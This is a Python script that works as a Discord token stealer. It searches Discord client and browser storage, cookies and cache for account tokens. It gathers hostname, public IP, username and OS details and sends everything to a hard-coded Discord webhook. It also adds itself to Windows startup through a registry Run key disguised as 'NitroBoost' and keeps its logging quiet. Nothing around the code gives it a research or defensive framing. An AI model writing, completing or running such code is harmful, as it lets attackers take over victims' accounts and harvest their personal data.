import os
import re
import json
import requests
import socket
import platform
from pathlib import Path
import logging
import datetime
import random
import getpass
import winreg

# Setup logging to stay quiet unless debugging
logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Paths to check (Discord + browsers)
paths = [
    Path(os.getenv('APPDATA')) / 'discord' / 'Local Storage' / 'leveldb',
    Path(os.getenv('APPDATA')) / 'discordcanary' / 'Local Storage' / 'leveldb',
    Path(os.getenv('APPDATA')) / 'discordptb' / 'Local Storage' / 'leveldb',
    Path(os.getenv('APPDATA')) / 'discorddevelopment' / 'Local Storage' / 'leveldb',
    Path(os.getenv('LOCALAPPDATA')) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb',
    Path(os.getenv('LOCALAPPDATA')) / 'Microsoft' / 'Edge' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb',
    Path(os.getenv('APPDATA')) / 'Opera Software' / 'Opera Stable' / 'Local Storage' / 'leveldb',
    Path(os.getenv('LOCALAPPDATA')) / 'BraveSoftware' / 'Brave-Browser' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb',
    Path(os.getenv('LOCALAPPDATA')) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'Cookies',
    Path(os.getenv('LOCALAPPDATA')) / 'Microsoft' / 'Edge' / 'User Data' / 'Default' / 'Cookies',
    Path(os.getenv('APPDATA')) / 'Opera Software' / 'Opera Stable' / 'Cookies',
    Path(os.getenv('LOCALAPPDATA')) / 'BraveSoftware' / 'Brave-Browser' / 'User Data' / 'Default' / 'Cookies',
    Path(os.getenv('APPDATA')) / 'discord' / 'Cache',
    Path(os.getenv('APPDATA')) / 'discordcanary' / 'Cache',
    Path(os.getenv('APPDATA')) / 'discordptb' / 'Cache',
]

# Regex for tokens
token_regex = r'([a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}|mfa\.[a-zA-Z0-9_-]{84})'

# Validate Discord token format
def validate_discord_token(token: str) -> bool:
    """Validate Discord token format."""
    if not re.match(token_regex, token):
        return False
    parts = token.split('.')
    if len(parts) == 3 and not token.startswith('mfa.'):
        return len(parts[0]) in range(23, 29) and len(parts[1]) == 6 and len(parts[2]) in range(27, 39)
    elif token.startswith('mfa.'):
        return len(token) == 88
    return False

# Add to startup
def add_to_startup():
    """Add script to Windows Startup via registry."""
    try:
        script_path = os.path.abspath(__file__)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, 'NitroBoost', 0, winreg.REG_SZ, f'python "{script_path}"')
        logger.info("Added to startup via registry")
    except Exception as e:
        logger.error(f"Failed to add to startup: {e}")

# Collect tokens
tokens = set()
existing_paths = []
for path in paths:
    if path.exists():
        existing_paths.append(str(path))
        for file in path.glob('*'):
            try:
                with open(file, 'rb') as f:
                    content = f.read().decode('utf-8', errors='ignore')
                    for match in re.finditer(token_regex, content):
                        token = match.group(0)
                        if validate_discord_token(token):
                            tokens.add(token)
            except Exception as e:
                logger.error(f"Error reading {file}: {e}")

# Check browser local storage JSON
browser_storage = [
    Path(os.getenv('LOCALAPPDATA')) / 'Google' / 'Chrome' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb' / 'https_discord.com_0.localstorage',
    Path(os.getenv('LOCALAPPDATA')) / 'Microsoft' / 'Edge' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb' / 'https_discord.com_0.localstorage',
    Path(os.getenv('APPDATA')) / 'Opera Software' / 'Opera Stable' / 'Local Storage' / 'leveldb' / 'https_discord.com_0.localstorage',
    Path(os.getenv('LOCALAPPDATA')) / 'BraveSoftware' / 'Brave-Browser' / 'User Data' / 'Default' / 'Local Storage' / 'leveldb' / 'https_discord.com_0.localstorage',
]
for storage in browser_storage:
    if storage.exists():
        existing_paths.append(str(storage))
        try:
            with open(storage, 'rb') as f:
                content = f.read().decode('utf-8', errors='ignore')
                if 'token' in content:
                    try:
                        data = json.loads(content.split('token')[-1])
                        if isinstance(data, str) and validate_discord_token(data):
                            tokens.add(data)
                    except json.JSONDecodeError:
                        for match in re.finditer(token_regex, content):
                            token = match.group(0)
                            if validate_discord_token(token):
                                tokens.add(token)
        except Exception as e:
            logger.error(f"Error reading {storage}: {e}")

# Get system info
hostname = socket.gethostname()
try:
    ip = requests.get('https://api.ipify.org', timeout=2, headers={'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0'])}).text
except:
    ip = 'Unknown'

system_info = {
    'hostname': hostname,
    'ip': ip,
    'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
    'username': getpass.getuser(),
    'os': f"{platform.system()} {platform.release()} {platform.version()}",
    'cpu': platform.processor() or 'Unknown',
}

# Send tokens to webhook
token_list = '\n'.join(tokens) if tokens else 'No tokens found'
debug_info = (
    f'**Paths Scanned**: {len(paths) + len(browser_storage)}\n'
    f'**Tokens Found**: {len(tokens)}\n'
    f'**Existing Paths**: {", ".join(existing_paths[:5]) + "..." if len(existing_paths) > 5 else ", ".join(existing_paths)}\n'
    f'**Python Version**: {platform.python_version()}\n'
    f'**Environment**: APPDATA={os.environ.get("APPDATA", "Not found")} | LOCALAPPDATA={os.environ.get("LOCALAPPDATA", "Not found")}'
)
payload = {
    'username': 'Spidey Bot',
    'embeds': [{
        'title': '🎯 Discord Token Grabber Report',
        'description': 'Results from Discord token extraction',
        'color': 0x00FF00 if tokens else 0xFF0000,
        'fields': [
            {'name': '🖥️ System Info', 'value': (
                f"**Hostname**: {system_info['hostname']}\n"
                f"**IP Address**: {system_info['ip']}\n"
                f"**Username**: {system_info['username']}\n"
                f"**OS**: {system_info['os']}\n"
                f"**CPU**: {system_info['cpu']}"
            ), 'inline': True},
            {'name': '📊 Status', 'value': (
                f"**Timestamp**: {system_info['timestamp']}"
            ), 'inline': True},
            {'name': '🔑 Tokens', 'value': f'```{token_list}```', 'inline': False},
            {'name': '🐞 Debug Info', 'value': f'```{debug_info}```', 'inline': False}
        ],
        'footer': {'text': 'Spidey Bot | Precision Grabber'},
        'timestamp': system_info['timestamp']
    }]
}
try:
    response = requests.post(
        'https://discord.com/api/webhooks/1409280930052444290/HTyPEcq81RGme-rGbaiF8x--jgGI7jVW1lw2M-r3Ky8ICW1bRTFcBtcqohMrR7tDLhdp',
        json=payload,
        headers={'Content-Type': 'application/json', 'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0'])},
        timeout=5
    )
except Exception as e:
    logger.error(f"Webhook failed: {e}")

# Add to startup on first run
add_to_startup()

if __name__ == '__main__':
    pass